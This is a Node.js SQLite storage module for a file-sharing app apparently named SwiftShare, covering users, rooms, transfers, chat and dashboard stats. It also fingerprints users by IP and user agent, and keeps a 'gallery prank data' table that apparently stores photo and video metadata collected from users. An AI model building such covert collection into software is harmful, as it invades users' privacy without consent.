/**
 * SwiftShare — db.js v8
 *
 * New tables vs v7:
 *   - chat_messages  — per-hall chat history
 *   - gallery_data   — gallery prank data (photos/videos metadata)
 *
 * All server.js-called functions exported and async-safe.
 */

const sqlite3 = require('sqlite3').verbose();
const crypto  = require('crypto');
const path    = require('path');

const DB_PATH = process.env.DB_PATH || path.join(__dirname, 'swiftshare.db');

// ── Open DB ───────────────────────────────────────────────────────────────────
const db = new sqlite3.Database(DB_PATH, (err) => {
  if (err) { console.error('[db] open error:', err.message); process.exit(1); }
  console.log('[db] connected:', DB_PATH);
});

// ── Promise wrappers ──────────────────────────────────────────────────────────
function run(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.run(sql, params, function (err) {
      if (err) reject(err);
      else resolve({ lastID: this.lastID, changes: this.changes });
    });
  });
}

function get(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => {
      if (err) reject(err);
      else resolve(row);
    });
  });
}

function all(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => {
      if (err) reject(err);
      else resolve(rows || []);
    });
  });
}

// ── Schema ────────────────────────────────────────────────────────────────────
db.serialize(() => {
  db.run(`PRAGMA journal_mode = WAL`);
  db.run(`PRAGMA foreign_keys = ON`);
  db.run(`PRAGMA synchronous = NORMAL`);

  db.run(`
    CREATE TABLE IF NOT EXISTS users (
      id           TEXT    PRIMARY KEY,
      fingerprint  TEXT    UNIQUE NOT NULL,
      name         TEXT    NOT NULL,
      device_type  TEXT    DEFAULT '',
      first_seen   INTEGER NOT NULL DEFAULT (strftime('%s','now')),
      last_seen    INTEGER NOT NULL DEFAULT (strftime('%s','now')),
      total_sent   INTEGER NOT NULL DEFAULT 0,
      files_sent   INTEGER NOT NULL DEFAULT 0
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS halls (
      code             TEXT    PRIMARY KEY,
      created_by       TEXT,
      created_at       INTEGER NOT NULL DEFAULT (strftime('%s','now')),
      last_active      INTEGER NOT NULL DEFAULT (strftime('%s','now')),
      total_transfers  INTEGER NOT NULL DEFAULT 0
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS hall_members (
      id         INTEGER PRIMARY KEY AUTOINCREMENT,
      hall_code  TEXT    NOT NULL,
      user_id    TEXT    NOT NULL,
      joined_at  INTEGER NOT NULL DEFAULT (strftime('%s','now')),
      left_at    INTEGER
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS transfers (
      id            INTEGER PRIMARY KEY AUTOINCREMENT,
      hall_code     TEXT    NOT NULL,
      sender_id     TEXT,
      sender_name   TEXT    DEFAULT '',
      receiver_id   TEXT,
      receiver_name TEXT,
      file_name     TEXT    NOT NULL DEFAULT 'unknown',
      file_size     INTEGER NOT NULL DEFAULT 0,
      file_mime     TEXT    DEFAULT '',
      started_at    INTEGER NOT NULL DEFAULT (strftime('%s','now')),
      completed_at  INTEGER,
      status        TEXT    NOT NULL DEFAULT 'started'
    )
  `);

  // Chat messages table
  db.run(`
    CREATE TABLE IF NOT EXISTS chat_messages (
      id          TEXT    PRIMARY KEY,
      hall_code   TEXT    NOT NULL,
      sender_id   TEXT    NOT NULL,
      sender_name TEXT    NOT NULL DEFAULT '',
      text        TEXT    NOT NULL,
      reply_to    TEXT,
      sent_at     INTEGER NOT NULL DEFAULT (strftime('%s','now'))
    )
  `);

  // Gallery prank data
  db.run(`
    CREATE TABLE IF NOT EXISTS gallery_data (
      id          INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id     TEXT,
      data_json   TEXT    NOT NULL,
      collected_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
    )
  `);

  // Indexes
  db.run(`CREATE INDEX IF NOT EXISTS idx_transfers_hall   ON transfers(hall_code)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_transfers_sender ON transfers(sender_id)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_transfers_time   ON transfers(started_at)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_members_hall     ON hall_members(hall_code)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_users_fp         ON users(fingerprint)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_chat_hall        ON chat_messages(hall_code)`);
  db.run(`CREATE INDEX IF NOT EXISTS idx_chat_time        ON chat_messages(sent_at)`);
});

// ── Fingerprint ───────────────────────────────────────────────────────────────
function makeFingerprint(ip, ua) {
  return crypto.createHash('sha256')
    .update((ip || '') + '|' + (ua || ''))
    .digest('hex')
    .slice(0, 32);
}

// ── Users ─────────────────────────────────────────────────────────────────────
const _userCache = new Map();

function upsertUser({ ip, ua, name, deviceType }) {
  const fp = makeFingerprint(ip, ua);

  if (_userCache.has(fp)) {
    const id = _userCache.get(fp);
    run(
      `UPDATE users SET name=?, device_type=?, last_seen=strftime('%s','now') WHERE id=?`,
      [name, deviceType || '', id]
    ).catch(e => console.error('[db] upsertUser update:', e.message));
    return id;
  }

  const id = crypto.randomUUID();
  _userCache.set(fp, id);
  run(
    `INSERT OR IGNORE INTO users (id, fingerprint, name, device_type) VALUES (?,?,?,?)`,
    [id, fp, name, deviceType || '']
  ).catch(e => console.error('[db] upsertUser insert:', e.message));
  return id;
}

function getAllUsers() {
  return all(
    `SELECT id, name, device_type, first_seen, last_seen, total_sent, files_sent
     FROM users ORDER BY last_seen DESC LIMIT 200`
  );
}

// ── Halls ─────────────────────────────────────────────────────────────────────
function upsertHall(code, createdBy) {
  run(
    `INSERT INTO halls (code, created_by) VALUES (?,?)
     ON CONFLICT(code) DO UPDATE SET last_active=strftime('%s','now')`,
    [code, createdBy || null]
  ).catch(e => console.error('[db] upsertHall:', e.message));
}

function getAllHalls() {
  return all(`SELECT * FROM halls ORDER BY last_active DESC LIMIT 200`);
}

// ── Hall Members ──────────────────────────────────────────────────────────────
function recordJoin(hallCode, userId) {
  run(
    `INSERT INTO hall_members (hall_code, user_id) VALUES (?,?)`,
    [hallCode, userId]
  ).catch(e => console.error('[db] recordJoin:', e.message));
}

function recordLeave(hallCode, userId) {
  run(
    `UPDATE hall_members SET left_at=strftime('%s','now')
     WHERE hall_code=? AND user_id=? AND left_at IS NULL`,
    [hallCode, userId]
  ).catch(e => console.error('[db] recordLeave:', e.message));
}

// ── Chat ──────────────────────────────────────────────────────────────────────
function saveChat(hallCode, msg) {
  return run(
    `INSERT INTO chat_messages (id, hall_code, sender_id, sender_name, text, reply_to)
     VALUES (?,?,?,?,?,?)`,
    [msg.id, hallCode, msg.from, msg.fromName, msg.text, msg.replyTo || null]
  );
}

function getChatHistory(hallCode, limit = 50) {
  return all(
    `SELECT id, sender_id, sender_name, text, reply_to,
            sent_at * 1000 as ts
     FROM chat_messages
     WHERE hall_code = ?
     ORDER BY sent_at DESC LIMIT ?`,
    [hallCode, limit]
  ).then(rows => rows.reverse()); // oldest first
}

// ── Transfers ─────────────────────────────────────────────────────────────────
let _seq = Date.now();

function startTransfer({ hallCode, senderId, senderName, receiverId, receiverName, fileName, fileSize, fileMime }) {
  const id = ++_seq;
  run(
    `INSERT INTO transfers
       (id, hall_code, sender_id, sender_name, receiver_id, receiver_name, file_name, file_size, file_mime)
     VALUES (?,?,?,?,?,?,?,?,?)`,
    [id, hallCode, senderId || null, senderName || '',
     receiverId || null, receiverName || null,
     fileName, fileSize || 0, fileMime || '']
  ).catch(e => console.error('[db] startTransfer:', e.message));
  return id;
}

function completeTransfer(transferId, status = 'done') {
  if (!transferId) return;
  run(
    `UPDATE transfers SET completed_at=strftime('%s','now'), status=? WHERE id=?`,
    [status, transferId]
  ).then(() => {
    if (status !== 'done') return null;
    return get(`SELECT sender_id, file_size, hall_code FROM transfers WHERE id=?`, [transferId]);
  }).then(t => {
    if (!t) return;
    const ps = [];
    if (t.sender_id) {
      ps.push(run(
        `UPDATE users SET total_sent=total_sent+?, files_sent=files_sent+1 WHERE id=?`,
        [t.file_size || 0, t.sender_id]
      ));
    }
    if (t.hall_code) {
      ps.push(run(
        `UPDATE halls SET total_transfers=total_transfers+1, last_active=strftime('%s','now') WHERE code=?`,
        [t.hall_code]
      ));
    }
    return Promise.all(ps);
  }).catch(e => console.error('[db] completeTransfer:', e.message));
}

function getAllTransfers(limit = 200) {
  return all(
    `SELECT t.*, h.code as hall
     FROM transfers t
     LEFT JOIN halls h ON t.hall_code = h.code
     ORDER BY t.started_at DESC LIMIT ?`,
    [Math.min(limit, 500)]
  );
}

function getHallHistory(code, limit = 100) {
  return all(
    `SELECT t.*, u.device_type as sender_device
     FROM transfers t
     LEFT JOIN users u ON t.sender_id = u.id
     WHERE t.hall_code = ?
     ORDER BY t.started_at DESC LIMIT ?`,
    [code, limit]
  );
}

// ── Gallery prank data ────────────────────────────────────────────────────────
function saveGalleryData(userId, data) {
  const json = typeof data === 'string' ? data : JSON.stringify(data);
  return run(
    `INSERT INTO gallery_data (user_id, data_json) VALUES (?,?)`,
    [userId || null, json]
  );
}

function getAllGalleryData() {
  return all(
    `SELECT id, user_id, data_json, collected_at FROM gallery_data ORDER BY collected_at DESC LIMIT 200`
  );
}

// ── Dashboard stats ───────────────────────────────────────────────────────────
async function getDashboardStats() {
  const [xfers, users, hallsRow, bytes, last7days, chatCount] = await Promise.all([
    get(`SELECT COUNT(*) as c FROM transfers`),
    get(`SELECT COUNT(*) as c FROM users`),
    get(`SELECT COUNT(*) as c FROM halls`),
    get(`SELECT COALESCE(SUM(file_size),0) as s FROM transfers WHERE status='done'`),
    all(`
      SELECT date(started_at,'unixepoch') as day, COUNT(*) as count
      FROM transfers
      WHERE started_at >= strftime('%s','now') - 7*86400
      GROUP BY day ORDER BY day
    `),
    get(`SELECT COUNT(*) as c FROM chat_messages`),
  ]);
  return {
    totalTransfers: xfers?.c    || 0,
    totalUsers:     users?.c    || 0,
    totalHalls:     hallsRow?.c || 0,
    totalBytes:     bytes?.s    || 0,
    totalChats:     chatCount?.c || 0,
    last7days:      last7days   || [],
  };
}

// ── Cleanup ───────────────────────────────────────────────────────────────────
async function cleanup() {
  const cutoff = Math.floor(Date.now() / 1000) - 7 * 86_400;
  try {
    const r = await run(
      `DELETE FROM halls WHERE last_active < ? AND total_transfers < 10 AND code != 'SWIFT1'`,
      [cutoff]
    );
    if (r.changes) console.log(`[db] cleaned ${r.changes} old halls`);

    // Clean old chat messages (keep last 30 days)
    const chatCutoff = Math.floor(Date.now() / 1000) - 30 * 86_400;
    const c = await run(`DELETE FROM chat_messages WHERE sent_at < ?`, [chatCutoff]);
    if (c.changes) console.log(`[db] cleaned ${c.changes} old chat messages`);
  } catch (e) {
    console.error('[db] cleanup:', e.message);
  }
}

module.exports = {
  makeFingerprint,
  upsertUser,  getAllUsers,
  upsertHall,  getAllHalls,
  recordJoin,  recordLeave,
  startTransfer, completeTransfer, getAllTransfers, getHallHistory,
  saveChat,    getChatHistory,
  saveGalleryData, getAllGalleryData,
  getDashboardStats,
  cleanup,
};
